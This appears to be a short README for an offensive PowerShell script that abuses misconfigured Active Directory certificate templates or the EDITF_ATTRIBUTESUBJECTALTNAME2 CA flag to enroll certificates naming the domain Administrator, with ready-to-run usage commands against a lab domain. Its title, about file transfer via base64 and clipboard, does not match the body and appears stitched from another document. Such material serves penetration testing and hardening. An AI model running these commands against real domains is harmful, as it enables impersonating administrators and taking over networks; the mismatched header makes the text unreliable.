# File transfer via base64 conversion and clipboard copy

## Create-AdminCertificate.ps1
The script needs to be run frmo a domain member and a domain user
It tries to enroll for certificates specifying a upn of your chosing
### Usage:
Enroll certificates using all insecure templates
```powershell
. .\Create-AdminCertificate.ps1 -desiredUPN Administrator@ad.seblab.at -TryAllTemplates -InsecureTemplatesOnly
```
Enroll certificates using a specific template. We will try to enroll even if the template does not allow for a manual subject name.
We still test as the CA might be configured with +editf_attributesubjectaltname2 and lets us add the upn anyways
```powershell
. .\Create-AdminCertificate.ps1 -desiredUPN Administrator@ad.seblab.at -TemplateName User
```



